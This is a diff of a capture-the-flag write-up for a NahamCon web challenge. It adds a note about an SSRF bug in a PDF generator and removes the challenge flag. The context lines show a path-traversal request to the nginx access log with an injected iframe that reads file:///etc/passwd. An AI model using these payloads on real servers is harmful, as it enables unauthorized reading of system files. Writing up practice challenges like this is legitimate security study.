@@ -786,7 +786,11 @@ Try path traversal fuzzing but it requires .log file
 
 I find a file called /var/log/nginx/access.log to save the access history and this is the only page where we can insert arbitrary content via params
 
+
+
 ![image](https://hackmd.io/_uploads/BJF25FbGxx.png)
+
+So what we can exploit? After read this article, I think there is a ssrf bug : https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators
 
 Try to add some iframe tag but the url is url-encoded `http://challenge.nahamcon.com:32725/api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe src='file:///etc/passwd'/>`
 
@@ -809,9 +813,6 @@ printf "GET /api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe s
 ```
 
 ![image](https://hackmd.io/_uploads/SyQ72tWfeg.png)
-
-Flag: flag{4a8a1baccfdf9b635b76c5df6f1fa97a}
-
 ## Talk Tuah 
 
 Updating...
